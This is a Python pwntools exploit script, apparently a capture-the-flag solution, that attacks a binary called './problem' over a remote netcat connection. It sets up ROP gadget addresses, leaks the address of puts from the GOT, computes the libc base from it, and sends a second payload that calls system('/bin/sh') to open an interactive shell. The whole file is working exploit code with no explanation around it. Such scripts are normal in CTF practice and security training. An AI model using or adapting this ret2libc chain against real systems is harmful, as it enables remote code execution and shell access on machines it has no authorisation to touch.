#!/usr/bin/python
from pwn import *

CONN = "nc 34.101.174.85 10010".split(" ")
HOST = CONN[1]
PORT = CONN[2]

# ===========================================================
#                    WRAPPER FUNCTION
# ===========================================================

def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x, drop=False): return io.recvuntil(x, drop=drop)
def rl(): return io.recvline()
def cl(): return io.clean()
def un64(x): return u64(x.ljust(8, b'\x00'))
def leak(name, addr): info(f"{name} @ {hex(addr)}")

# ===========================================================
#                           SETUP
# ===========================================================

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
b *0x00000000004008AD
b *puts
c
""".format(
    **locals()
)

# Binary filename
exe = "./problem"

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)

# Change logging level to help with debugging (error/warning/info/debug)
# context.terminal = "tmux splitw -h".split(" ")ls
context.log_level = "debug"

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6_2.27-3ubuntu1.6_amd64.so")
# ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

if args.REMOTE:
    pass
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    # ld = ELF("/lib64/ld-linux-x86-64.so.2", checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = 9

POP_RSP_R13_R14_R15_RET = 0x000000000040091d
POP_RDI = 0x0000000000400923
POP_RBP = 0x0000000000400720
MAIN = 0x0000000000400859
RET = 0x0000000000400609

# Start program
io = start()

# # Build the payload
# rop.call("puts", [elf.got.puts])
# rop.call("main")

# print(rop.dump())
payload = flat({offset: [
  POP_RDI,
  elf.got["puts"],
  elf.plt["puts"],
  MAIN,
]})

# Send the payload
rl()
sl(payload)

leaked = int(un64(cl()))
info("Leaked: " + hex(leaked))
libc.address = leaked - libc.sym["puts"]
info("Libc addr: " + hex(libc.address))

payload = flat({offset: [
  RET,
  POP_RDI,
  libc.search(b"/bin/sh\x00").__next__(),
  libc.sym["system"]
]})

sl(payload)

# Got Shell?
io.interactive()